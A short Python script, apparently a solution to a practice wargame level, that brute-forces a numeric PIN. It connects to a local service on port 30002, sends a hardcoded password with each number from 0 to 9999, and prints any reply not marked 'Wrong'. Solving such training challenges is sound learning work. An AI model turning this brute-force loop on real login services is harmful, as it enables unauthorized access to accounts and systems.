import socket

current_password = "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

conn = socket.create_connection(('localhost', 30002))

for i in range(10000):
	si = str(i).zfill(3)
	conn.send(f"{current_password} {si}\n".encode())
	response = conn.recv(1024)
	if "Wrong" in response.decode() or response.decode() == "":
		continue
	print(i, response)